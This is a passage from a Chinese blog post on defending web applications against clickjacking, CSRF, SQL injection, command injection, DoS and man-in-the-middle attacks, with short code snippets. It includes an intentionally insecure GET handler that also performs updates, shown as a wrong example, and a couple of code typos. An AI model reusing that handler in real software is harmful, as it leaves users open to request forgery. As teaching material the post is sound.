+<h5 id="iframe攻击"><a href="#iframe攻击" class="headerlink" title="iframe攻击"></a>iframe攻击</h5><p>通过iframe构造页面，在其放欲攻击的页面，然后放一个按钮，当点击按钮时会穿透到攻击页面</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">function</span> <span class="title function_">App</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="title function_">onContentClick</span> = (<span class="params"></span>) =&gt; <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;content click&#x27;</span>);</span><br><span class="line">    <span class="keyword">const</span> <span class="title function_">onButtonClick</span> = (<span class="params"></span>) =&gt; <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;button click&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">        <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;onButtonClick&#125;</span>&gt;</span>按钮<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;oncontent&quot;</span> <span class="attr">onClick</span>=<span class="string">&#123;onContentClick&#125;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                content</span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    );</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>当点击时日志会出现 <code>button click</code></p>
+<p>防御手段:</p>
+<p>通过设置X-Frame-Options: DENY&#x2F;SAMEORIGIN，阻止iframe构造页面</p>
+<p>DENY为禁止 SAMEORIGIN为同源才可构造</p>
+<h5 id="职责分开"><a href="#职责分开" class="headerlink" title="职责分开"></a>职责分开</h5><p>GET !&#x3D;&#x3D; GET + POST</p>
+<p>不应当即响应GET，又响应POST，很容易造成用户信息泄露甚至纂改，应当分为两个处理</p>
+<p>错误示范</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public <span class="keyword">async</span> <span class="title function_">getAndUpdate</span>(<span class="params">ctx</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; update, id &#125; = ctx.<span class="property">query</span>;</span><br><span class="line">    <span class="keyword">if</span> (update)&#123;</span><br><span class="line">        <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">update</span>(update);</span><br><span class="line">    &#125;</span><br><span class="line">    ctx.<span class="property">body</span> = <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">get</span>(id);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="Samesite-Cookie"><a href="#Samesite-Cookie" class="headerlink" title="Samesite Cookie"></a>Samesite Cookie</h5><p>限制cookie</p>
+<p>我的页面cookie只能在我的页面中使用</p>
+<p>其它页面cookie都不能带上我的cookie</p>
+<p>从根源上解决CSRF</p>
+<p>限制的是</p>
+<ol>
+<li>Cookie domain</li>
+<li>页面域名</li>
+</ol>
+<p>服务器端设置<br><code>Set-Cookie: SameSite=None; Secure;</code></p>
+<h5 id="防御CSRF的正确姿势"><a href="#防御CSRF的正确姿势" class="headerlink" title="防御CSRF的正确姿势"></a>防御CSRF的正确姿势</h5><p>通过中间件来过滤</p>
+<h3 id="注入-1"><a href="#注入-1" class="headerlink" title="注入"></a>注入</h3><h4 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h4><p>使用prepared statement</p>
+<p>预编译语句</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">PREPARE</span> q <span class="keyword">FROM</span> <span class="string">&#x27;SELECT * FROM users WHERE id = ?&#x27;</span>;</span><br><span class="line"><span class="keyword">SET</span> <span class="variable">@gender</span> <span class="operator">=</span> <span class="string">&#x27;female&#x27;</span>;</span><br><span class="line"><span class="keyword">EXECUTE</span> q <span class="keyword">USING</span> <span class="variable">@gender</span></span><br><span class="line"><span class="keyword">DEALLOCATE</span> <span class="keyword">PREPARE</span> q;</span><br></pre></td></tr></table></figure>
+
+<h4 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h4><p>最小原则<br>不要给sudo或者root</p>
+<p>建立允许名单 + 过滤<br>例如禁止rm</p>
+<p>对URL类型参数进行协议、域名、ip等限制<br>例如禁止访问内网</p>
+<h3 id="DoS-1"><a href="#DoS-1" class="headerlink" title="DoS"></a>DoS</h3><h4 id="正则"><a href="#正则" class="headerlink" title="正则"></a>正则</h4><p>完善代码review工作，避免使用贪婪匹配，特别是在接口处理上</p>
+<p>代码扫描 + 正则性能测试</p>
+<p>不要使用用户提供的正则</p>
+<h4 id="DDoS-1"><a href="#DDoS-1" class="headerlink" title="DDoS"></a>DDoS</h4><ol>
+<li>流量治理</li>
+</ol>
+<ul>
+<li>负载均衡</li>
+<li>API 网关</li>
+<li>CDN</li>
+</ul>
+<ol>
+<li>快速自动扩容</li>
+<li>非核心业务降级</li>
+</ol>
+<p>在负载均衡及 API 网关处可以进行流量识别过滤掉异常请求</p>
+<p>通过CDN、快速自动扩容、非核心业务降级进行抗量，提高服务器承载能力</p>
+<h4 id="中间人"><a href="#中间人" class="headerlink" title="中间人"></a>中间人</h4><p>使用HTTPS加密传输内容</p>
+<p>HTTPS特性：</p>
+<ul>
+<li>可靠性：加密</li>
+<li>完整性：MAC验证</li>
+<li>不可抵赖性：数字签名 确保双方身份</li>
+</ul>
+<p>HTTPS握手过程略</p>
+<p><strong>完整性</strong><br>服务器在内容中加入hash信息，客户端收到后重新计算并校验hash</p>
+<p><strong>数字签名</strong><br>私钥签名，公钥验证</p>
+<p><strong>不可抵赖性</strong><br>存在一个CA(证书机构), 服务方会将一些元信息以及公钥合并成一个信息，使用CA提供的私钥对证书进行签名，形成服务器端保存的证书，这个证书传递给浏览器，浏览器利用CA公钥进行校验，如果校验成功，则证书有效</p>
+<p>浏览器会大量内置各个CA公约</p>
+<p>也要注意防止证书签名算法不够健壮时仍有证书风险</p>
+<h4 id="SRI"><a href="#SRI" class="headerlink" title="SRI"></a>SRI</h4><p>可以防范CDN被hack</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://demo.com/script.js&quot;</span> <span class="attr">integrity</span>=<span class="string">&quot;sha384-&#123;some-hash-value&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 伪代码 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">scipt</span> <span class="attr">lang</span>=<span class="string">&quot;javascript&quot;</span>&gt;</span></span><br><span class="line">    const remoteHash = hash(content);</span><br><span class="line">    if (tagHash !== remoteHash) &#123;</span><br><span class="line">        throw new Error(&#x27;Hash mismatch&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h4><p>浏览器：</p>
+<p>Feature-Policy&#x2F;Permission-Policy</p>
+<p>一个源(页面)，可以使用哪些功能，例如麦克风、摄像头等</p>
+<ul>
+<li>camera</li>
+<li>microphone</li>
+<li>geolocation</li>
+<li>autoplay<br>…</li>
+</ul>
+<p>当使用iframe时，可以使用<code>&lt;iframe allow=&quot;...&quot;&gt;</code> 来设置</p>
+<h2 id="尾声"><a href="#尾声" class="headerlink" title="尾声"></a>尾声</h2><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul>
+<li>安全无小事</li>
+<li>使用的依赖也可能成为被攻破的一环</li>
+<li>保持学习的心态</li>
+</ul>
+<h3 id="推荐阅读"><a href="#推荐阅读" class="headerlink" title="推荐阅读"></a>推荐阅读</h3><p><a target="_blank" rel="noopener" href="https://www.amazon.com/Web-Application-Security-Exploitation-Countermeasures/dp/1492053112/ref=sr_1_3?crid=3KZBER4W7Z6JF&dchild=1&keywords=web+security&qid=1627822659&sprefix=web+secu,aps,360&sr=8-3">Web Application Security: Exploitation and Countermeasures for Modern Web Applications</a></p>
+<p><a target="_blank" rel="noopener" href="https://imnerd.org/samesite.html">SameSite 那些事</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/AngusFu/diary/issues/32">关于 Web 安全突然想到的 #32</a></p>
+<p><a target="_blank" rel="noopener" href="https://aws.amazon.com/cn/shield/ddos-attack-protection/">什么是 DDoS 攻击？</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/web-security/" rel="tag"># web, security</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/css-study-2/" rel="prev" title="深入CSS">
+      <i class="fa fa-chevron-left"></i> 深入CSS
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/go-context/" rel="next" title="go 中的context">
+      go 中的context <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E7%AF%87"><span class="nav-number">1.</span> <span class="nav-text">攻击篇</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS-%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB"><span class="nav-number">1.1.</span> <span class="nav-text">XSS(跨站脚本攻击)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-number">1.1.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%89%B9%E7%82%B9"><span class="nav-number">1.1.2.</span> <span class="nav-text">特点</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A1%88%E4%BE%8B"><span class="nav-number">1.1.3.</span> <span class="nav-text">案例</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8BXSSI-Stored-XSS"><span class="nav-number">1.1.3.1.</span> <span class="nav-text">存储型XSSI(Stored XSS)</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8BXSS-Reflected-XSS"><span class="nav-number">1.1.3.2.</span> <span class="nav-text">反射型XSS(Reflected XSS)</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#DOM-based-XSS"><span class="nav-number">1.1.3.3.</span> <span class="nav-text">DOM-based XSS</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Mutation-based-XSS"><span class="nav-number">1.1.3.4.</span> <span class="nav-text">Mutation-based XSS</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Cross-site-request-forgery-CSRF"><span class="nav-number">1.2.</span> <span class="nav-text">Cross-site request forgery(CSRF)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%A4%BA%E4%BE%8B"><span class="nav-number">1.2.1.</span> <span class="nav-text">示例</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5"><span class="nav-number">1.3.</span> <span class="nav-text">注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL-%E6%B3%A8%E5%85%A5"><span class="nav-number">1.3.1.</span> <span class="nav-text">SQL 注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%B6%E5%AE%83"><span class="nav-number">1.3.2.</span> <span class="nav-text">其它</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%89%A7%E8%A1%8C"><span class="nav-number">1.3.2.1.</span> <span class="nav-text">执行</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%AF%BB%E5%8F%96%E4%BF%AE%E6%94%B9"><span class="nav-number">1.3.2.2.</span> <span class="nav-text">读取修改</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#SSRF"><span class="nav-number">1.3.2.3.</span> <span class="nav-text">SSRF</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DoS"><span class="nav-number">1.4.</span> <span class="nav-text">DoS</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8E%9F%E7%90%86-1"><span class="nav-number">1.4.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A1%88%E4%BE%8B-1"><span class="nav-number">1.4.2.</span> <span class="nav-text">案例</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DDoS"><span class="nav-number">1.5.</span> <span class="nav-text">DDoS</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8E%9F%E7%90%86-2"><span class="nav-number">1.5.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A1%88%E4%BE%8B-2"><span class="nav-number">1.5.2.</span> <span class="nav-text">案例</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB"><span class="nav-number">1.6.</span> <span class="nav-text">中间人攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8E%9F%E7%90%86-3"><span class="nav-number">1.6.1.</span> <span class="nav-text">原理</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%98%B2%E5%BE%A1%E7%AF%87"><span class="nav-number">2.</span> <span class="nav-text">防御篇</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS"><span class="nav-number">2.1.</span> <span class="nav-text">XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%97%A0%E6%B3%95%E9%81%BF%E5%85%8D%E5%8A%A8%E6%80%81%E7%94%9F%E6%88%90DOM"><span class="nav-number">2.1.1.</span> <span class="nav-text">无法避免动态生成DOM</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#DOM"><span class="nav-number">2.1.1.1.</span> <span class="nav-text">DOM</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#SVG"><span class="nav-number">2.1.1.2.</span> <span class="nav-text">SVG</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%87%AA%E5%AE%9A%E4%B9%89%E8%B7%B3%E8%BD%AC%E8%BF%9E%E6%8E%A5"><span class="nav-number">2.1.1.3.</span> <span class="nav-text">自定义跳转连接</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%87%AA%E5%AE%9A%E4%B9%89%E6%A0%B7%E5%BC%8F"><span class="nav-number">2.1.1.4.</span> <span class="nav-text">自定义样式</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CSRF"><span class="nav-number">2.2.</span> <span class="nav-text">CSRF</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5"><span class="nav-number">2.2.1.</span> <span class="nav-text">同源策略</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Content-Security-Policy-CSP"><span class="nav-number">2.2.2.</span> <span class="nav-text">Content Security Policy(CSP)</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AE%BE%E7%BD%AE"><span class="nav-number">2.2.2.1.</span> <span class="nav-text">服务器端设置</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%89%8D%E7%AB%AF%E8%AE%BE%E7%BD%AE"><span class="nav-number">2.2.2.2.</span> <span class="nav-text">前端设置</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%98%B2%E5%BE%A1"><span class="nav-number">2.2.3.</span> <span class="nav-text">防御</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%A3%80%E6%9F%A5%E8%AF%B7%E6%B1%82%E5%A4%B4%E9%83%A8"><span class="nav-number">2.2.3.1.</span> <span class="nav-text">检查请求头部</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#token"><span class="nav-number">2.2.3.2.</span> <span class="nav-text">token</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#iframe%E6%94%BB%E5%87%BB"><span class="nav-number">2.2.3.3.</span> <span class="nav-text">iframe攻击</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%81%8C%E8%B4%A3%E5%88%86%E5%BC%80"><span class="nav-number">2.2.3.4.</span> <span class="nav-text">职责分开</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Samesite-Cookie"><span class="nav-number">2.2.3.5.</span> <span class="nav-text">Samesite Cookie</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%98%B2%E5%BE%A1CSRF%E7%9A%84%E6%AD%A3%E7%A1%AE%E5%A7%BF%E5%8A%BF"><span class="nav-number">2.2.3.6.</span> <span class="nav-text">防御CSRF的正确姿势</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5-1"><span class="nav-number">2.3.</span> <span class="nav-text">注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="nav-number">2.3.1.</span> <span class="nav-text">SQL注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#exec"><span class="nav-number">2.3.2.</span> <span class="nav-text">exec</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DoS-1"><span class="nav-number">2.4.</span> <span class="nav-text">DoS</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%AD%A3%E5%88%99"><span class="nav-number">2.4.1.</span> <span class="nav-text">正则</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#DDoS-1"><span class="nav-number">2.4.2.</span> <span class="nav-text">DDoS</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%AD%E9%97%B4%E4%BA%BA"><span class="nav-number">2.4.3.</span> <span class="nav-text">中间人</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SRI"><span class="nav-number">2.4.4.</span> <span class="nav-text">SRI</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Other"><span class="nav-number">2.4.5.</span> <span class="nav-text">Other</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%BE%E5%A3%B0"><span class="nav-number">3.</span> <span class="nav-text">尾声</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">3.1.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8E%A8%E8%8D%90%E9%98%85%E8%AF%BB"><span class="nav-number">3.2.</span> <span class="nav-text">推荐阅读</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Sonui</p>
+  <div class="site-description" itemprop="description">Sonui's Blog</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">13</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Sonui</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
